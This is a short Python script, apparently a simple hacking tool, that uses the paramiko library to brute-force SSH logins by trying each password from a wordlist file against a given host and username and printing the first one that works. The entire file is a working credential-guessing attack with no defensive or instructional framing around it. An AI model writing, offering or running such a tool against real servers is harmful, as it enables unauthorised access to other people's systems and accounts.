import paramiko


def ssh_connect(target, password, username, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(hostname=target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code


def brute_force(password_file, target, username):
    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()

            try:
                response = ssh_connect(target=target, password=password, username=username)

                if response == 0:
                    print("Password found: " + password)
                    exit(0)
            except Exception as e:
                print(e)
                pass

